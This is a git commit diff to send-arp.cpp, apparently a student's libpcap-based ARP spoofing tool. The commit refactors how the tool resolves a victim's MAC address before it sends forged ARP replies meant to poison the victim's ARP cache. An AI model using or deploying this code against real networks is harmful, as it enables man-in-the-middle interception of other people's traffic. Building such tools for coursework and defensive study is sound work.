7db26096aeaeb175900e951711e328b3d6c1a878
shoon004 <shoon004@korea.ac.kr>
2025-04-09 17:06:40 +0900

    Update send-arp.cpp

--- send-arp.cpp
+++ send-arp.cpp
@@ -8,7 +8,7 @@
 #include <arpa/inet.h>
 #include <unistd.h>
 #include <ctime>
-
+#include <string>
 #include "ethhdr.h"
 #include "arphdr.h"
 #include "mac.h"
@@ -60,56 +60,50 @@ bool getMyInfo(char* ifname) {
     myIP = Ip(ntohl(sin->sin_addr.s_addr));
 
     close(sockfd);
+
     return true;
 }
 
-bool sendArpRequest(pcap_t* pcap, Ip targetIp) {
-    EthArpPacket packet;
+bool getVictimMac(pcap_t* pcap, Mac& sender_mac, Ip sender_ip) {
+    uint8_t packet[42];
+    EthHdr* eth = (EthHdr*)packet;
+    ArpHdr* arp = (ArpHdr*)(packet + sizeof(EthHdr));
 
-    packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");
-    packet.eth_.smac_ = myMac;
-    packet.eth_.type_ = htons(EthHdr::Arp);
+    eth->dmac_ = Mac("ff:ff:ff:ff:ff:ff");
+    eth->smac_ = myMac;
+    eth->type_ = htons(EthHdr::Arp);
 
-    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
-    packet.arp_.pro_ = htons(EthHdr::Ip4);
-    packet.arp_.hln_ = 6;
-    packet.arp_.pln_ = 4;
-    packet.arp_.op_  = htons(ArpHdr::Request);
-    packet.arp_.smac_ = myMac;
-    packet.arp_.sip_  = htonl(myIP);
-    packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
-    packet.arp_.tip_  = htonl(targetIp);
+    arp->hrd_ = htons(ArpHdr::ETHER);
+    arp->pro_ = htons(EthHdr::Ip4);
+    arp->hln_ = 6; // MAC address length
+    arp->pln_ = 4; // IP address length
+    arp->op_  = htons(ArpHdr::Request);
+    arp->smac_ = myMac;
+    arp->sip_  = htonl(myIP);
+    arp->tmac_ = Mac("00:00:00:00:00:00");
+    arp->tip_  = htonl(sender_ip);
 
-    if (pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&packet), sizeof(packet)) != 0) {
-        fprintf(stderr, "[-] Failed to send ARP request: %s\n", pcap_geterr(pcap));
-        return false;
-    }
-    return true;
-}
+    pcap_sendpacket(pcap, packet, sizeof(packet));
 
-Mac getVictimMac(pcap_t* pcap, Ip victimIp, int timeout_sec = 5) {
-    time_t start = time(nullptr);
     while (true) {
-        if (time(nullptr) - start > timeout_sec) {
-            fprintf(stderr, "[-] Timeout: no ARP reply from %s\n", std::string(victimIp).c_str());
-            return Mac::nullMac();
-        }
-
         struct pcap_pkthdr* header;
-        const u_char* packet;
-        int res = pcap_next_ex(pcap, &header, &packet);
-        if (res == -1 || res == PCAP_ERROR) {
-            fprintf(stderr, "[-] Error reading packet: %s\n", pcap_geterr(pcap));
-            return Mac::nullMac();
-        }
+        const u_char* recv_packet;
+        int res = pcap_next_ex(pcap, &header, &recv_packet);
+        if (res == 0) continue;
+        if (res == -1 || res == -2) break;
 
-        EthArpPacket* recv = (EthArpPacket*)packet;
-        if (recv->eth_.type() != EthHdr::Arp) continue;
-        if (recv->arp_.op() != ArpHdr::Reply) continue;
-        if (recv->arp_.sip() != victimIp) continue;
+        EthHdr* r_eth = (EthHdr*)recv_packet;
+        if (ntohs(r_eth->type_) != EthHdr::Arp) continue;
 
-        return recv->arp_.smac();
+        ArpHdr* r_arp = (ArpHdr*)(recv_packet + sizeof(EthHdr));
+        if (ntohs(r_arp->op_) != ArpHdr::Reply) continue;
+        if (r_arp->sip() != sender_ip) continue;
+
+        sender_mac = r_arp->smac();
+        return true;
     }
+
+    return false;
 }
 
 bool sendArpSpoof(pcap_t* pcap, Ip targetIp, Mac victimMac, Ip victimIp) {
@@ -166,17 +160,19 @@ int main(int argc, char* argv[]) {
     for (int i = 2; i < argc; i += 2) {
         Ip senderIp = Ip(argv[i]);
         Ip targetIp = Ip(argv[i + 1]);
+        Mac senderMac;
 
         printf("\n[*] Resolving victim %s...\n", std::string(senderIp).c_str());
-        if (!sendArpRequest(pcap, senderIp)) continue;
 
-        Mac senderMac = getVictimMac(pcap, senderIp);
-        if (senderMac.isNull()) continue;
-        printf("[+] Victim MAC: %s\n", std::string(senderMac).c_str());
+        if (!getVictimMac(pcap, senderMac, senderIp)) {
+            printf("[-] Failed to get sender MAC: %s\n", std::string(senderIp).c_str());
+            continue;
+        }
 
         if (sendArpSpoof(pcap, targetIp, senderMac, senderIp))
             printf("[+] Spoofed ARP reply sent to %s\n", std::string(senderIp).c_str());
     }
+
 
     pcap_close(pcap);
     return 0;
